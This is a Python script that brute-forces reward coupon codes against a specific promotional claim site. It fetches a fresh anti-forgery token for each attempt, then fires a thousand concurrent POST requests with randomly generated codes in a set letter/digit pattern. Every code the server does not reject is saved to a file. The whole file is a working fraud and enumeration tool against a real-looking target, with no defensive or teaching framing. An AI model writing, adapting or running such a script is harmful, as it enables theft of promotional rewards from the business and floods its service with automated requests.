import asyncio
import aiohttp
import random
import string
import time
from bs4 import BeautifulSoup
import re
import threading

counter = 1
get_url = "https://snickersexam.woohoo.in/claimreward"
post_url = "https://snickersexam.woohoo.in/ClaimReward/VerifyCode"
# token = "un1vebaUfENlzNQxz7ii35Y5l26xFt50qONV-lYRCS0Zuv3QpnLAzpO17mgUWI8AcFWz94A4v0VVetQyXujkyIpEFszdkjdrhuQkJuPvVQY1"

headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": r"Mozilla/5.0(Windows NT 10.0;Win64;x64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 109.0.0.0 Safari / 537.36"
    }


def timeit(func):

    def timeit_wrapper(*args, **kwargs):
        start_time = time.perf_counter()
        result = func(*args, **kwargs)
        end_time = time.perf_counter()
        total_time = end_time - start_time
        print(total_time)

        return result
    return timeit_wrapper

async def generate_codes(string_length=9):

    letters = string.ascii_uppercase
    digits = string.digits
    random_code = [random.choice(letters) for i in range(string_length)]
    random_code[2] = random.choice(digits)
    random_code[4] = random.choice(digits)
    random_code[5] = random.choice(digits)

    return "".join(random_code)

async def find_token(res):
    soup = BeautifulSoup(res, "lxml")
    return soup.find('input', {'name': '__RequestVerificationToken'}).get('value')

async def generate_token(session,code):

        async with session.get(get_url,headers = headers) as response:
            res = await response.text()
            token= await find_token(res)

        data = {
            "__RequestVerificationToken": token,
            "CouponType=": "",
            "couponcode": code,
            "mobilenumber": "",
            "userotp": "",
            "hdnlogin": "",
            "FirstName": "",
            "LastName": "",
            "City": ""
        }

        global counter
        async with session.post(post_url, headers=headers, data=data,cookies={"Cookie": "__RequestVerificationToken:%s" % str(token)}) as response:
            res = await response.text()
            soup = BeautifulSoup(res, "lxml")

            if soup.body.find(text=re.compile('invalid')) or soup.body.find(text=re.compile('DOCTYPE')):
                pass
            else:
                print(f"Code found is {code} at {counter}\n")
                with open("codes.txt", "a") as f:
                    f.write(f"{code}\n")
                    f.close()

            counter += 1
            if not counter % 10000:
                print(f"\n.................... {counter} items checked ......................\n")

            return res


async def tasks():
        connector = aiohttp.TCPConnector(limit=200)
        async with aiohttp.ClientSession(connector=connector) as session:

            tokens = [generate_token(session,await generate_codes()) for i in range(1000)]

            return await asyncio.gather(*tokens)


if __name__ == "__main__":
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except:
        pass
    asyncio.run(tasks())